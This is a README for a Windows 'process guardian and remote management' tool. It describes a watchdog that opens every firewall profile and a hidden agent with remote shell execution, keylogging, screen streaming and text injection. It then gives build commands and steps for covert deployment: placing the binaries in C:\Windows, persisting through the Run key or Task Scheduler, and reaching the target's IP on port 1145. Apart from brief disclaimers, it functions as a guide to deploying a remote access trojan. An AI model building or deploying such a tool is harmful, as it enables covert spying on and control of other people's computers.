# Windows Process Guardian & Remote Management Tool

This repository contains two companion Windows executables that demonstrate system monitoring, process resilience, and remote administration capabilities. All code is provided for educational and research purposes only.

---

## Components Overview

| Component | Source File | Build Output | Primary Role |
|-----------|-------------|--------------|--------------|
| Guardian (Watchdog) | `wd.cpp` | `wd.exe` | Monitors and restarts the main process; configures firewall rules |
| Master (Remote Agent) | `main.rs` | `svc.exe` | Offers a web-based control panel with keyboard/monitoring and remote command execution |

---

## Detailed Features

### Guardian (`wd.exe`)
- **Process monitoring**: Periodically checks whether `svc.exe` is running; if not, launches it immediately.
- **Firewall policy adjustment**: Executes `netsh` commands to set all firewall profiles to allow inbound and outbound traffic (facilitates remote access).
- **Parameter forwarding**: When starting `svc.exe`, passes its own full file path and a fixed port number (1145) as command‑line arguments.

### Master (`svc.exe`)
- **Web server**: Listens on the port provided by the guardian, serving an interactive HTML interface.
- **Command execution**: Accepts `cmd` commands via a web form, which are executed through `cmd.exe /c`.
- **Keyboard logging**: Uses both `device_query` and `rdev` libraries to capture key down/up events and displays them in real time on the web panel.
- **Screen capture**: Continuously pushes BMP screenshots of the primary monitor through a WebSocket connection.
- **Text injection**: Supports sending arbitrary text strings to the currently active window via the `txt` option.
- **Perpetual command loop**: Upon startup, the master spawns an infinite `for /l` loop that repeatedly executes a command supplied as an argument (e.g., `sc start svc`).

---

## Build Instructions

### Prerequisites
- **Rust toolchain** (1.70 or later)
- **C/C++ compiler** (MinGW-w64 or MSVC recommended)
- **Windows SDK** (if using MSVC)

### Automated Build
A `compile.bat` script is provided at the project root:
```batch
cargo build --release
mv ../target/release/MTCGAGA.exe ../target/release/svc.exe
gcc -Oz -s -mwindows -o ../target/release/wd.exe wd.cpp -luser32 -lkernel32 -ladvapi32
```
Run it from a command prompt to produce both executables in the `target/release` directory.

### Manual Build (Optional)
- **Rust**:
  ```bash
  cargo build --release
  ```
  Rename the resulting binary to `svc.exe`.

- **C++**:
  ```bash
  gcc -Oz -s -mwindows -o wd.exe wd.cpp -luser32 -lkernel32 -ladvapi32
  ```

---

## Deployment and Execution

1. **Place files**  
   Copy `wd.exe` and `svc.exe` to `C:\Windows\` (the guardian expects this path by default; macros `MASTER_PATH` and `DEFAULT_PORT` can be adjusted).

2. **Privileges**  
   `wd.exe` requires **administrator rights** to modify firewall settings. For persistent operation, schedule it via Task Scheduler or the Windows Registry `Run` key to start with elevated privileges.

3. **Startup sequence**
    - Launch `wd.exe`; it will immediately apply firewall rules and start `svc.exe`.
    - `svc.exe` will bind to port `1145` (configurable in `wd.cpp`).
    - Open a browser and navigate to `http://<target-ip>:1145` to access the management interface.

---

## Configuration Options

| Parameter | Location | Description |
|-----------|----------|-------------|
| Master executable path | `wd.cpp` macro `MASTER_PATH` | Full path to `svc.exe` |
| Listening port | `wd.cpp` macro `DEFAULT_PORT` | Port used by the Rust web server |
| Startup command | `main.rs` `Command::new("cmd")...` | The infinite loop command executed by the master; can be changed to any valid shell command |

---

## Dependencies

### Rust (Cargo.toml)
- `axum` – web framework
- `tokio` – async runtime
- `device_query` / `rdev` – keyboard event capture
- `enigo` – input simulation
- `xcap` – screen capture
- `serde` – form serialisation

### C++ (Windows API)
- `<windows.h>` – core system APIs
- `<tlhelp32.h>` – process snapshot enumeration
- `kernel32`, `user32`, `advapi32` – linked libraries (explicitly specified in the build command)

---

## Important Notes

- This toolset is intended for legitimate system administration and authorised testing environments only.
- The keyboard logging and screen capture features may capture sensitive information; ensure proper consent and compliance with applicable laws and policies.
- Modifying firewall policies can expose the system to network risks; assess the security implications before deploying.
- Both executables run without a console window (`/SUBSYSTEM:WINDOWS`) and can only be terminated via Task Manager or similar tools.

---

## License

This project is released under the **Unlicense** – a public domain dedication. You may use, modify, and distribute the code without any restrictions. For the full license text, see [unlicense.org](https://unlicense.org/).